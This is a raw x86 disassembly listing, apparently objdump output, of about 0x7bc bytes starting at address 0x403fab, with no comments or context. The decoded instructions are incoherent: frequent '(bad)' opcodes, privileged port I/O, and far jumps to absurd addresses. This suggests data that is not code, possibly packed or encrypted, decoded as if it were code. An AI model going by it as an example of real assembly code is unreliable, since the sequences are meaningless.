  403fab:	fdivp  st(5),st
  403fad:	adc    eax,0x6220df00
  403fb2:	push   ebx
  403fb3:	xchg   BYTE PTR [esi-0x7b992fd],cl
  403fb9:	fidiv  WORD PTR [ebx]
  403fbb:	jecxz  0x403f95
  403fbd:	jnp    0x404001
  403fbf:	mov    eax,ds:0x325adf1
  403fc4:	mov    ?,WORD PTR [ecx+0x21c24544]
  403fca:	rcl    DWORD PTR [ebp-0x30],cl
  403fcd:	in     eax,dx
  403fce:	ins    BYTE PTR es:[edi],dx
  403fcf:	push   esi
  403fd0:	pusha  
  403fd1:	jns    0x403f96
  403fd3:	mov    cs,WORD PTR [ebp-0x10]
  403fd6:	pop    ecx
  403fd7:	lods   al,BYTE PTR ds:[esi]
  403fd8:	pop    esi
  403fd9:	dec    eax
  403fda:	jge    0x403f85
  403fdc:	pop    ebx
  403fdd:	cwde   
  403fde:	ret    
  403fdf:	inc    esp
  403fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fe1:	loopne 0x403fad
  403fe3:	add    BYTE PTR [eax],0x78
  403fe6:	stos   DWORD PTR es:[edi],eax
  403fe7:	ret    0x2ebb
  403fea:	jne    0x40405d
  403fec:	cmp    BYTE PTR [edi+eiz*1],ch
  403fef:	pushf  
  403ff0:	inc    eax
  403ff1:	ror    DWORD PTR [eax-0x61],0xff
  403ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff6:	repnz repz test al,0x4
  403ffa:	push   ss
  403ffb:	add    edx,esp
  403ffd:	js     0x404032
  403fff:	push   esi
  404000:	push   esi
  404001:	(bad)  [edx+0x9]
  404004:	adc    al,0x71
  404006:	aas    
  404007:	test   DWORD PTR [edi+0x22],ecx
  40400a:	les    edx,FWORD PTR [edi+0xa]
  40400d:	xchg   ch,bl
  40400f:	jno    0x404048
  404011:	and    DWORD PTR [ebx-0x7882ca72],esi
  404017:	scas   eax,DWORD PTR es:[edi]
  404018:	in     al,0x1c
  40401a:	pop    ebp
  40401b:	inc    ecx
  40401c:	(bad)  
  40401d:	xor    ecx,DWORD PTR [ebp+0x2a]
  404020:	mov    ebx,edx
  404022:	enter  0xeb02,0x72
  404026:	adc    DWORD PTR [eax+0x2f34b9f],0xffffff89
  40402d:	lods   eax,DWORD PTR ds:[esi]
  40402e:	cs or  eax,ecx
  404031:	jnp    0x403fe0
  404033:	popa   
  404034:	mov    al,0xbc
  404036:	mov    dl,0xd3
  404038:	fst    DWORD PTR [edi+0x20aaca0f]
  40403e:	ffreep st(6)
  404040:	ficomp WORD PTR [edx]
  404042:	inc    edx
  404043:	pop    ebx
  404044:	ins    DWORD PTR es:[edi],dx
  404045:	inc    ebp
  404046:	mov    gs,WORD PTR [ebp-0x7f]
  404049:	sahf   
  40404a:	data16 or dl,BYTE PTR [ebx]
  40404d:	fimul  WORD PTR [ebx+0x1b80a4b5]
  404053:	mov    dh,0x4b
  404055:	mov    al,ds:0x284e4cc7
  40405a:	adc    eax,edx
  40405c:	push   edx
  40405d:	shl    ebp,1
  40405f:	push   ebx
  404060:	mov    dl,BYTE PTR ds:0xc0dd1e96
  404066:	fidiv  DWORD PTR [esi]
  404068:	mov    ch,0xf6
  40406a:	cmp    DWORD PTR [edi],0x7a
  40406d:	mov    esi,0x1080b19e
  404072:	mov    al,0x9a
  404074:	xchg   ecx,eax
  404075:	mov    ebx,0x74998d20
  40407a:	push   0x29
  40407c:	or     dh,BYTE PTR [esi+0x57]
  40407f:	frstpm(287 only) 
  404081:	and    DWORD PTR [esi],0xfffffff2
  404084:	adc    al,0x99
  404086:	scas   eax,DWORD PTR es:[edi]
  404087:	sub    BYTE PTR [ebx+0x36],cl
  40408a:	(bad)  
  40408b:	dec    edi
  40408c:	xor    BYTE PTR [ecx-0x78fa4fb2],0xd1
  404093:	lods   al,BYTE PTR ds:[esi]
  404094:	test   eax,0x4d9a479e
  404099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40409a:	ss ins BYTE PTR es:[edi],dx
  40409c:	sub    DWORD PTR [edx-0x6929a13e],esp
  4040a2:	lods   al,BYTE PTR ds:[esi]
  4040a3:	adc    dl,BYTE PTR [eax+0x7843e1cf]
  4040a9:	loop   0x40409f
  4040ab:	data16 jle 0x4040e1
  4040ae:	adc    eax,0xf77fa33f
  4040b3:	jb     0x404108
  4040b5:	mov    dh,0x93
  4040b7:	arpl   WORD PTR [esp+ebx*4-0x5259b3e2],bx
  4040be:	popa   
  4040bf:	mov    bh,0x94
  4040c1:	in     eax,0x36
  4040c3:	outs   dx,DWORD PTR ds:[esi]
  4040c4:	and    eax,eax
  4040c6:	mov    dh,0xee
  4040c8:	cmp    ch,BYTE PTR [edx+0x5]
  4040cb:	loope  0x404148
  4040cd:	sub    edi,DWORD PTR [edx+0x5c]
  4040d0:	fldenv [ecx-0x7607df78]
  4040d7:	jnp    0x404091
  4040d9:	jne    0x404109
  4040db:	std    
  4040dc:	xchg   esi,eax
  4040dd:	pushf  
  4040de:	fwait
  4040df:	mov    ds:0xf5dd23fd,al
  4040e4:	cdq    
  4040e5:	jb     0x4040a2
  4040e7:	mov    dl,0x1a
  4040e9:	iret   
  4040ea:	aam    0x88
  4040ec:	jno    0x4040b6
  4040ee:	aaa    
  4040ef:	fdivr  DWORD PTR [edi-0x4af90bd3]
  4040f5:	mov    BYTE PTR [eax+0x3a],bh
  4040f8:	in     eax,dx
  4040f9:	pop    es
  4040fa:	outs   dx,DWORD PTR ds:[esi]
  4040fb:	mov    ch,0x3e
  4040fd:	jge    0x404137
  4040ff:	pop    ss
  404100:	xor    bh,al
  404102:	das    
  404103:	popf   
  404104:	adc    ebx,DWORD PTR [ebx+edx*1]
  404107:	jl     0x4040f2
  404109:	pop    es
  40410a:	pop    edx
  40410b:	and    eax,0x612011ad
  404110:	cmp    eax,0x56109cff
  404115:	fwait
  404116:	lahf   
  404117:	stos   DWORD PTR es:[edi],eax
  404118:	cwde   
  404119:	stos   DWORD PTR es:[edi],eax
  40411a:	jp     0x40417e
  40411c:	fcmovne st,st(1)
  40411e:	or     BYTE PTR [eax+0x17],0xde
  404122:	cmp    al,0x41
  404124:	out    dx,al
  404125:	scas   eax,DWORD PTR es:[edi]
  404126:	inc    edi
  404127:	repz ret 
  404129:	push   ds
  40412a:	jo     0x404115
  40412c:	in     eax,0x31
  40412e:	push   edx
  40412f:	popa   
  404130:	inc    esi
  404131:	push   ecx
  404132:	lea    ebx,[ebp-0x74be188b]
  404138:	inc    ebp
  404139:	mov    esp,0x33469d35
  40413e:	stos   BYTE PTR es:[edi],al
  40413f:	add    ebx,ecx
  404141:	(bad)  
  404142:	push   edi
  404143:	jno    0x4041b1
  404145:	mov    bl,0xc6
  404147:	mov    bh,0x20
  404149:	pop    es
  40414a:	jmp    0xd82a:0x50e65e3
  404151:	mov    ds:0x8ac2d1db,eax
  404156:	dec    ebp
  404157:	mov    bl,0x18
  404159:	add    eax,0xedab2d0d
  40415e:	(bad)  {k3}{z}
  404163:	xchg   ebx,eax
  404164:	push   cs
  404165:	push   ebx
  404166:	pop    ebp
  404167:	or     al,0xb2
  404169:	daa    
  40416a:	retf   
  40416b:	inc    ecx
  40416c:	into   
  40416d:	mov    edx,esi
  40416f:	push   0xc1eab225
  404174:	or     BYTE PTR [edi],0x2f
  404177:	push   es
  404178:	add    cl,ah
  40417a:	sbb    dl,ah
  40417c:	ss int 0xe9
  40417f:	push   es
  404180:	jb     0x4041d5
  404182:	rcr    BYTE PTR [edx+0x6f2f5c74],cl
  404188:	stos   DWORD PTR es:[edi],eax
  404189:	mov    esi,0xfad16422
  40418e:	xchg   esp,esi
  404190:	sar    BYTE PTR [esi-0x56],0x9
  404194:	mov    cl,0x68
  404196:	or     DWORD PTR [eax+0x69af7963],0x73d70386
  4041a0:	stos   BYTE PTR es:[edi],al
  4041a1:	loope  0x4041a8
  4041a3:	jno    0x4041a1
  4041a5:	lahf   
  4041a6:	mov    eax,ds:0x754db4fb
  4041ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ac:	cmp    eax,0x46ba5d88
  4041b1:	mov    bh,0x86
  4041b3:	add    DWORD PTR [ebp+0x75],edi
  4041b6:	inc    edx
  4041b7:	imul   edi,DWORD PTR [esi],0xffffffa4
  4041ba:	mov    esi,0x7cb669c8
  4041bf:	repnz sbb eax,0xfa39da5b
  4041c5:	jae    0x404150
  4041c7:	(bad)  
  4041c9:	and    eax,0xf1bf3ca
  4041ce:	fldcw  WORD PTR [ebx-0x1f]
  4041d1:	sub    BYTE PTR [eax-0x7e],dh
  4041d4:	mov    dl,0x1a
  4041d6:	cmp    esi,DWORD PTR [esp+eiz*4]
  4041d9:	imul   ecx,DWORD PTR [ecx],0x11057f05
  4041df:	test   eax,0x6311709a
  4041e4:	mov    edi,0xe76f19c3
  4041e9:	setne  BYTE PTR [edx-0x72]
  4041ed:	lahf   
  4041ee:	mov    eax,ds:0x4e22207a
  4041f3:	add    al,0x46
  4041f5:	mov    ds:0xe0d75600,eax
  4041fa:	jnp    0x40420b
  4041fc:	pop    ss
  4041fd:	std    
  4041fe:	clc    
  4041ff:	sbb    eax,0x39f42509
  404204:	das    
  404205:	jp     0x404226
  404207:	cmp    DWORD PTR [ecx-0x165be192],0xffffffc1
  40420e:	pause  
  404210:	adc    DWORD PTR [eax-0x7a],ebp
  404213:	push   eax
  404214:	fild   QWORD PTR [eax+0x26dfa659]
  40421a:	int    0xdf
  40421c:	or     ch,BYTE PTR [esi-0x6ef260b8]
  404222:	push   ss
  404223:	mov    bl,bl
  404225:	adc    dl,dl
  404227:	push   cs
  404228:	cld    
  404229:	dec    ebp
  40422a:	cmp    DWORD PTR [esi-0x13],0x7b
  40422e:	sbb    al,0xd
  404230:	sahf   
  404231:	push   ecx
  404232:	push   ds
  404233:	cmp    ah,BYTE PTR [edx]
  404235:	mov    BYTE PTR [ebp+0x5c],bl
  404238:	cs cdq 
  40423a:	dec    esi
  40423b:	addr16 (bad) 
  40423e:	pop    eax
  40423f:	out    dx,eax
  404240:	and    al,0x22
  404242:	js     0x40427f
  404244:	jl     0x404207
  404246:	out    0xc9,eax
  404248:	retf   0x5729
  40424b:	sahf   
  40424c:	push   edi
  40424d:	push   esp
  40424e:	cmc    
  40424f:	scas   al,BYTE PTR es:[edi]
  404250:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  404252:	ss mov dh,0x3e
  404255:	sbb    al,0xb8
  404257:	push   0x64
  404259:	cmp    BYTE PTR [ebx-0x477298a3],al
  40425f:	fist   DWORD PTR [ecx+0x652bd62b]
  404265:	mov    ds:0x16eef8a5,eax
  40426a:	std    
  40426b:	dec    ebp
  40426c:	pop    ebx
  40426d:	sahf   
  40426e:	ins    DWORD PTR es:[edi],dx
  40426f:	xor    DWORD PTR [ecx],0xa
  404272:	shl    BYTE PTR [edx+0x62],cl
  404275:	push   0xffffffa2
  404277:	add    edx,DWORD PTR [eax+0x49584cfd]
  40427d:	inc    esp
  40427e:	cmc    
  40427f:	data16 jge 0x404266
  404282:	test   eax,0xb9dfbb72
  404287:	xchg   esp,eax
  404288:	fiadd  WORD PTR [ecx-0x30]
  40428b:	in     eax,0x46
  40428d:	dec    eax
  40428e:	mov    WORD PTR [ecx+esi*1+0x1e],fs
  404292:	gs jae 0x40427a
  404295:	aad    0x93
  404297:	jno    0x4042f2
  404299:	ins    BYTE PTR es:[edi],dx
  40429a:	or     ebp,esp
  40429c:	shr    DWORD PTR ds:0x6cc1590e,1
  4042a2:	ror    DWORD PTR [ebp+eax*4+0x24],0xc
  4042a7:	sti    
  4042a8:	jne    0x4042c2
  4042aa:	dec    edi
  4042ab:	fidiv  DWORD PTR [edi]
  4042ad:	jne    0x404320
  4042af:	cmp    eax,0x27e676c6
  4042b4:	(bad)  
  4042b5:	inc    esp
  4042b6:	pusha  
  4042b7:	(bad)  
  4042b8:	(bad)  
  4042ba:	mov    esp,DWORD PTR [edx-0x2bc2b9f3]
  4042c0:	push   0xf
  4042c2:	cs push esp
  4042c4:	mov    dl,0xc8
  4042c6:	and    ch,al
  4042c8:	push   esp
  4042c9:	mov    bh,0xa5
  4042cb:	ss push eax
  4042cd:	(bad)  
  4042ce:	out    0x59,al
  4042d0:	xor    dh,BYTE PTR [edi+eax*8]
  4042d3:	test   al,0xc5
  4042d5:	xor    al,0x21
  4042d7:	adc    eax,0x5f559761
  4042dc:	jb     0x40429e
  4042de:	mov    al,0xc2
  4042e0:	fdivr  QWORD PTR [ecx+edi*4]
  4042e3:	sub    ecx,DWORD PTR [esi]
  4042e5:	dec    esi
  4042e6:	lock inc ebx
  4042e8:	inc    ebp
  4042e9:	(bad)  
  4042ea:	mov    esp,0x332f7a3a
  4042ef:	xchg   ebx,eax
  4042f0:	sub    al,0xff
  4042f2:	clc    
  4042f3:	add    al,0xa9
  4042f5:	push   edx
  4042f6:	imul   ebx,DWORD PTR [eax],0xde88fa0d
  4042fc:	jo     0x404379
  4042fe:	popf   
  4042ff:	je     0x4042d5
  404301:	cmp    al,ah
  404303:	lahf   
  404304:	loope  0x40433f
  404306:	sti    
  404307:	sub    eax,0x98c0f0a2
  40430c:	test   BYTE PTR [ebx-0x41],ch
  40430f:	dec    esi
  404310:	push   ss
  404311:	sar    DWORD PTR [edx+0x17],0x1a
  404315:	out    dx,eax
  404316:	xor    edx,DWORD PTR [eax+0x515bf200]
  40431c:	inc    ebx
  40431d:	cs push edx
  40431f:	lods   al,BYTE PTR ds:[esi]
  404320:	jns    0x404365
  404322:	inc    esp
  404323:	(bad)  
  404324:	pusha  
  404325:	jae    0x4042b4
  404327:	mov    esp,0x7d85f89c
  40432c:	out    dx,al
  40432d:	pop    DWORD PTR [ecx-0x11d0dd99]
  404333:	ret    0xfdec
  404336:	jnp    0x40433d
  404338:	dec    ebx
  404339:	out    0xe3,al
  40433b:	add    bh,cl
  40433d:	and    dl,BYTE PTR [esi-0x7dcad7c2]
  404343:	jge    0x4043a8
  404345:	mov    eax,ds:0x714736ca
  40434a:	shl    edx,1
  40434c:	sbb    BYTE PTR [eax-0x22f6a2ad],0x58
  404353:	xor    DWORD PTR [edx+0x47],ebx
  404356:	fsubr  st,st(3)
  404358:	mov    cl,0xa6
  40435a:	adc    DWORD PTR [eax],ebx
  40435c:	mov    al,0x89
  40435e:	inc    eax
  40435f:	pop    esp
  404360:	das    
  404361:	sti    
  404362:	aad    0x66
  404364:	push   0xffffffb0
  404366:	or     al,0xca
  404368:	mov    cl,0x52
  40436a:	fsub   DWORD PTR [ecx+0x52]
  40436d:	inc    edi
  40436e:	cmp    al,0x64
  404370:	sub    dh,BYTE PTR [ebp+0x1e]
  404373:	sbb    al,0x16
  404375:	mov    edi,0x2b6f27b2
  40437a:	shl    DWORD PTR [edi+eax*8],0x81
  40437e:	dec    esp
  40437f:	jno    0x404310
  404381:	scas   eax,DWORD PTR es:[edi]
  404382:	stos   BYTE PTR es:[edi],al
  404383:	mov    bl,0x72
  404385:	sbb    edx,eax
  404387:	js     0x40430d
  404389:	popf   
  40438a:	pusha  
  40438b:	ins    BYTE PTR es:[edi],dx
  40438c:	outs   dx,BYTE PTR ds:[esi]
  40438d:	and    ecx,0x9617db94
  404393:	sub    al,0xe9
  404395:	(bad)  
  404396:	sub    ah,BYTE PTR [ecx]
  404398:	or     al,0x49
  40439a:	jbe    0x404392
  40439c:	lods   eax,DWORD PTR ds:[esi]
  40439d:	jns    0x4043bd
  40439f:	shr    DWORD PTR [ecx+0x42],1
  4043a2:	mov    bl,0xb8
  4043a4:	imul   ecx,DWORD PTR [ebx-0x62],0xffffffad
  4043a8:	cmp    al,0x8e
  4043aa:	mov    ecx,0x7463b6d7
  4043af:	dec    edi
  4043b0:	pop    esi
  4043b1:	dec    ebx
  4043b2:	mov    ch,0x7c
  4043b4:	mov    al,0xf0
  4043b6:	call   0x5f7ea6e2
  4043bb:	scas   al,BYTE PTR es:[edi]
  4043bc:	iret   
  4043bd:	stos   DWORD PTR es:[edi],eax
  4043be:	(bad)  
  4043bf:	mov    eax,?
  4043c1:	cwde   
  4043c2:	stc    
  4043c3:	push   edx
  4043c4:	mov    al,0x17
  4043c6:	ss out 0x64,al
  4043c9:	push   edx
  4043ca:	ins    BYTE PTR es:[edi],dx
  4043cb:	stc    
  4043cc:	call   0x1fda0348
  4043d1:	das    
  4043d2:	repz add bh,BYTE PTR [ebx+0x5d]
  4043d6:	mov    ebx,0x87e1faee
  4043db:	adc    BYTE PTR [edi-0x69],al
  4043de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043df:	ret    
  4043e0:	scas   eax,DWORD PTR es:[edi]
  4043e1:	call   0xac01:0x1e18f47b
  4043e8:	mov    bl,cl
  4043ea:	push   edi
  4043eb:	mov    esi,0xfcdb9649
  4043f0:	jmp    0x80a9:0xe1b2ce82
  4043f7:	jno    0x4043f6
  4043f9:	repz add DWORD PTR [edx+0x4a5317d8],eax
  404400:	cmp    dl,BYTE PTR [eax-0x3f]
  404403:	pushf  
  404404:	mov    al,BYTE PTR [ebp+eiz*4+0x63]
  404408:	cmp    esi,esi
  40440a:	out    0x73,eax
  40440c:	call   0x6c22:0xd5c2c2b
  404413:	popa   
  404414:	pop    esi
  404415:	ja     0x4043b5
  404417:	cli    
  404418:	mov    eax,ds:0xd4ad744e
  40441d:	mov    ebp,0x43f53dcc
  404422:	retf   0x6cfc
  404425:	jmp    0x4043b4
  404427:	adc    DWORD PTR [edi-0x3d],eax
  40442a:	out    0xd7,al
  40442c:	sbb    eax,0xd645e4b7
  404431:	mov    esp,DWORD PTR [eax+0x33e512d9]
  404437:	loop   0x4043fc
  404439:	loope  0x4043d2
  40443b:	cmp    eax,0x555709ba
  404440:	and    BYTE PTR [edi+eiz*2-0x46],0x71
  404445:	sbb    eax,0xa2f3c59d
  40444a:	rcr    BYTE PTR [ebx+0x4e],0xbc
  40444e:	jg     0x404460
  404450:	cmovb  ebp,DWORD PTR [esi+ebx*1]
  404454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404455:	aaa    
  404456:	lds    esi,FWORD PTR [esi-0x1d]
  404459:	outs   dx,DWORD PTR ds:[esi]
  40445a:	xchg   ebp,ecx
  40445c:	add    DWORD PTR [ebx-0x35],esp
  40445f:	shl    BYTE PTR [esp+ebp*1],cl
  404462:	mov    DWORD PTR [ebp-0x658d848b],edx
  404468:	aam    0x4d
  40446a:	neg    edi
  40446c:	cmp    eax,0x1a47b770
  404471:	loopne 0x404424
  404473:	stos   BYTE PTR es:[edi],al
  404474:	jge    0x404444
  404476:	and    al,0xb3
  404478:	lods   al,BYTE PTR ds:[esi]
  404479:	push   eax
  40447a:	clc    
  40447b:	jnp    0x404429
  40447d:	lock rcl BYTE PTR [esi+0x25cf46d7],1
  404484:	test   BYTE PTR [edi+0x49],0xeb
  404488:	push   edx
  404489:	hlt    
  40448a:	and    al,0xf9
  40448c:	xor    DWORD PTR [edx],ebx
  40448e:	xor    eax,DWORD PTR [eax+0x43cdaace]
  404494:	(bad)  
  404495:	mov    bl,0xa2
  404497:	cs mov ss,esi
  40449a:	push   0x9dcc2c9e
  40449f:	in     eax,dx
  4044a0:	cmp    edx,ebp
  4044a2:	pusha  
  4044a3:	add    DWORD PTR [esi+0x1a],0xffffffa6
  4044a7:	add    ebx,DWORD PTR [eax]
  4044a9:	js     0x404491
  4044ab:	out    dx,eax
  4044ac:	nop
  4044ad:	mov    edx,0xa86c62f1
  4044b2:	inc    esi
  4044b3:	int    0x7c
  4044b5:	aam    0xa3
  4044b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b8:	push   ecx
  4044b9:	cwde   
  4044ba:	and    al,BYTE PTR [esi+eiz*2]
  4044bd:	sbb    DWORD PTR [ecx+ecx*2+0x1b60bb77],ebp
  4044c4:	in     eax,dx
  4044c5:	push   ds
  4044c6:	mov    ecx,0x7c4f466c
  4044cb:	fstp   DWORD PTR [eax+0x2a]
  4044ce:	dec    eax
  4044cf:	test   DWORD PTR [ebp-0x6446ed09],esi
  4044d5:	dec    DWORD PTR [edi]
  4044d7:	mov    bl,0x6
  4044d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044da:	pushf  
  4044db:	pop    edi
  4044dc:	rcr    ecx,0x3c
  4044df:	mov    cl,0x72
  4044e1:	adc    ebx,edi
  4044e3:	xlat   BYTE PTR ds:[ebx]
  4044e4:	fidivr WORD PTR [ebp-0x1f1cd7dc]
  4044ea:	lds    eax,FWORD PTR [ecx-0x46]
  4044ed:	add    ah,al
  4044ef:	retf   
  4044f0:	je     0x404539
  4044f2:	add    al,0xf3
  4044f4:	push   cs
  4044f5:	jmp    0x2ee7:0xe98d1efa
  4044fc:	(bad)  
  4044fd:	or     ebx,0x78
  404500:	sti    
  404501:	rcr    edx,0x5f
  404504:	icebp  
  404505:	hlt    
  404506:	jnp    0x40455e
  404508:	repz add al,0x77
  40450b:	mov    BYTE PTR [edx+0x7b],ah
  40450e:	sub    ebp,DWORD PTR [eax+0x18e0c5ad]
  404514:	or     edx,edi
  404516:	int3   
  404517:	(bad)
  40451a:	pop    edx
  40451b:	(bad)  [edx+0x8]
  40451e:	sub    al,0x8f
  404520:	imul   esp,DWORD PTR [esi-0x52],0xc
  404524:	(bad)  
  404526:	adc    eax,0x6898a9e2
  40452b:	mov    ecx,0xc1458779
  404530:	xchg   ecx,eax
  404531:	repnz cmp edx,DWORD PTR [ecx+0x5208fe57]
  404538:	aas    
  404539:	rcl    BYTE PTR [ebp+0x77b592cc],0xbf
  404540:	cmp    al,0x0
  404542:	lahf   
  404543:	inc    esi
  404544:	mov    eax,0x187d28f9
  404549:	push   es
  40454a:	inc    edi
  40454b:	ds push 0xffffffb9
  40454e:	pop    edx
  40454f:	sahf   
  404550:	xor    edx,ebp
  404552:	sahf   
  404553:	loope  0x4044da
  404555:	sub    al,0xc0
  404557:	fld    QWORD PTR [esi+edi*1+0x525021ae]
  40455e:	js     0x404583
  404560:	mov    ebp,0x4a6aa7dc
  404565:	pop    es
  404566:	pop    esp
  404567:	(bad)  
  404568:	into   
  404569:	shl    DWORD PTR [ebx+esi*4+0x5],1
  40456d:	les    edx,FWORD PTR [ecx-0x50]
  404570:	jecxz  0x404586
  404572:	cmp    al,0x19
  404574:	fst    DWORD PTR [eax]
  404576:	sub    ecx,ebp
  404578:	data16 ja 0x404569
  40457b:	retf   0x5b83
  40457e:	sub    DWORD PTR [eax-0x4b],edi
  404581:	sub    bl,BYTE PTR ds:0x549a7190
  404587:	jge    0x4045a2
  404589:	inc    esp
  40458a:	das    
  40458b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40458c:	push   es
  40458d:	jge    0x4045d8
  40458f:	imul   eax,DWORD PTR [edx-0x453dc6ef],0xfffffff3
  404596:	retf   
  404597:	aaa    
  404598:	out    dx,al
  404599:	pop    ebx
  40459a:	mul    DWORD PTR [edi]
  40459c:	xchg   ecx,eax
  40459d:	loope  0x40457c
  40459f:	repnz or eax,0xef10dcf0
  4045a5:	or     esi,DWORD PTR [esi+ebp*1]
  4045a8:	pushf  
  4045a9:	sub    al,0x42
  4045ab:	jecxz  0x40455a
  4045ad:	inc    esi
  4045ae:	jnp    0x4045f3
  4045b0:	and    cl,cl
  4045b2:	sub    ebx,DWORD PTR [edi+edx*4-0x3a569eda]
  4045b9:	daa    
  4045ba:	dec    ebx
  4045bb:	cmp    ecx,ecx
  4045bd:	cmp    dh,cl
  4045bf:	std    
  4045c0:	stos   DWORD PTR es:[edi],eax
  4045c1:	daa    
  4045c2:	push   esi
  4045c3:	sbb    DWORD PTR [ebp-0x69],ebx
  4045c6:	sti    
  4045c7:	fild   DWORD PTR [edx]
  4045c9:	repnz shl DWORD PTR [edi*1+0x49156ae2],cl
  4045d1:	dec    esi
  4045d2:	xchg   DWORD PTR [ebp+0x58c8f020],esi
  4045d8:	cmc    
  4045d9:	ss ja  0x4045c4
  4045dc:	sti    
  4045dd:	pop    ds
  4045de:	lods   al,BYTE PTR ds:[esi]
  4045df:	(bad)  [eax-0x29]
  4045e2:	fnsave [ebx+0x60]
  4045e5:	mov    ecx,0xa92ce2e3
  4045ea:	push   ebx
  4045eb:	cmc    
  4045ec:	add    BYTE PTR fs:[edx-0x13baa140],cl
  4045f3:	fimul  DWORD PTR ds:0xf568361c
  4045f9:	dec    esi
  4045fa:	mov    edx,0x6af6cd49
  4045ff:	cmp    BYTE PTR [ebx+ebp*4+0x41],bh
  404603:	adc    dl,BYTE PTR [ecx+0x71]
  404606:	in     al,dx
  404607:	adc    DWORD PTR [eax],0x2e870f9a
  40460d:	cmp    DWORD PTR [edi-0x7bbbed90],esi
  404613:	push   cs
  404614:	mov    edi,esp
  404616:	jecxz  0x404677
  404618:	test   al,0x2
  40461a:	call   ebx
  40461c:	mov    esi,0xf53cafe0
  404621:	cmp    al,BYTE PTR [esi]
  404623:	lea    ebp,[esi-0x3012c287]
  404629:	ins    DWORD PTR es:[edi],dx
  40462a:	xchg   DWORD PTR [ebx+eiz*2+0x1a],esi
  40462e:	jns    0x404633
  404630:	mov    ecx,DWORD PTR [esi]
  404632:	cmp    ebx,edx
  404634:	xor    esi,DWORD PTR [eax+eax*8]
  404637:	sub    BYTE PTR [edx+0x50],bh
  40463a:	cmc    
  40463b:	pop    ecx
  40463c:	push   eax
  40463d:	cmp    ecx,esp
  40463f:	dec    ebx
  404640:	push   ss
  404641:	sbb    al,0x25
  404643:	sti    
  404644:	int    0xed
  404646:	loop   0x40467b
  404648:	ja     0x40469d
  40464a:	fmul   DWORD PTR [esi]
  40464c:	cwde   
  40464d:	retf   
  40464e:	call   0x3e4944f6
  404653:	jmp    0xb642fce0
  404658:	loope  0x404607
  40465a:	adc    DWORD PTR [ebx],esp
  40465c:	dec    edi
  40465d:	je     0x404694
  40465f:	or     DWORD PTR [ebx-0x545c3096],esi
  404665:	outs   dx,DWORD PTR ds:[esi]
  404666:	or     BYTE PTR [ecx+0x9],bl
  404669:	out    dx,eax
  40466a:	leave  
  40466b:	js     0x4046c2
  40466d:	dec    ecx
  40466e:	ss dec esi
  404670:	xlat   BYTE PTR ds:[ebx]
  404671:	imul   ebp,DWORD PTR ss:[ebp+0x1372c4a9],0x30f7b3f4
  40467c:	es mov al,0xbc
  40467f:	ffree  st(6)
  404681:	xchg   esi,ecx
  404683:	cdq    
  404684:	jp     0x404634
  404686:	cmp    bl,BYTE PTR [edi-0x418cdb00]
  40468c:	mov    cl,BYTE PTR [esi+0x7d86be52]
  404692:	(bad)  
  404693:	enter  0x7892,0x47
  404697:	dec    eax
  404698:	fidivr DWORD PTR [eax+eax*4]
  40469b:	ins    BYTE PTR es:[edi],dx
  40469c:	xlat   BYTE PTR ds:[ebx]
  40469d:	xor    BYTE PTR [edi+0xf],0x66
  4046a1:	fisubr WORD PTR [edx]
  4046a3:	push   esp
  4046a4:	and    bh,ah
  4046a6:	mov    ?,WORD PTR [ecx+0x10]
  4046a9:	xor    bl,BYTE PTR [ebx-0x76]
  4046ac:	cld    
  4046ad:	sbb    BYTE PTR ss:[ebp+0x31],dh
  4046b1:	xor    ebp,0x4dca5208
  4046b7:	add    dl,ch
  4046b9:	(bad)  
  4046ba:	lods   al,BYTE PTR ds:[esi]
  4046bb:	sbb    dl,al
  4046bd:	out    0x28,al
  4046bf:	sbb    eax,DWORD PTR [ebp+0xfda8cf3]
  4046c5:	(bad)  
  4046c6:	mov    BYTE PTR [esi-0x793cd0b1],ch
  4046cc:	xchg   edx,eax
  4046cd:	xor    al,0xfb
  4046cf:	cld    
  4046d0:	aas    
  4046d1:	mov    DWORD PTR [ebp+0x49],ebx
  4046d4:	call   0x56fac999
  4046d9:	xlat   BYTE PTR ds:[ebx]
  4046da:	fwait
  4046db:	mov    dh,0xd3
  4046dd:	jge    0x40470a
  4046df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046e0:	or     al,ch
  4046e2:	inc    ebx
  4046e3:	out    0xec,eax
  4046e5:	ds adc ebx,ebp
  4046e8:	mov    dl,BYTE PTR [edi]
  4046ea:	pusha  
  4046eb:	shr    DWORD PTR [esp+ebp*8-0x3d],0x8e
  4046f0:	sahf   
  4046f1:	mov    ds:0xdbb418ee,eax
  4046f6:	cmc    
  4046f7:	sbb    ebp,edi
  4046f9:	enter  0x6ccf,0x2e
  4046fd:	sbb    cl,BYTE PTR ds:0xe1ac29ba
  404703:	sub    dh,ah
  404705:	mov    bl,BYTE PTR [ecx+0x52]
  404708:	xor    al,0x23
  40470a:	(bad)  
  40470b:	retf   0x38c6
  40470e:	sub    eax,0x4ea82a09
  404713:	mov    DWORD PTR [ecx-0x58],esp
  404716:	pushf  
  404717:	and    DWORD PTR [eax-0x7b],0x72748768
  40471e:	adc    DWORD PTR [ecx+0x6249983d],ebp
  404724:	jns    0x4046b1
  404726:	es jle 0x4046da
  404729:	jbe    0x4046bc
  40472b:	test   eax,0x35b3b1bf
  404730:	mov    BYTE PTR [esi-0x4bceb573],dl
  404736:	inc    esp
  404737:	sbb    ah,BYTE PTR [esi-0xa93c03c]
  40473d:	ret    0x709e
  404740:	sub    esi,esp
  404742:	in     al,dx
  404743:	mov    eax,ds:0x3353eb46
  404748:	test   BYTE PTR [edi],bh
  40474a:	in     eax,0xb4
  40474c:	iret   
  40474d:	fisub  DWORD PTR [ecx]
  40474f:	fidivr DWORD PTR ds:0x7a5b058b
  404755:	add    DWORD PTR [ebx],ebx
  404757:	cmp    al,0x9f
  404759:	js     0x4047bb
  40475b:	push   edx
  40475c:	xchg   ebx,eax
  40475d:	sub    BYTE PTR [edi-0x784bc74f],bh
  404763:	in     eax,0xa8
  404765:	rol    dl,1
  404767:	repnz out dx,al
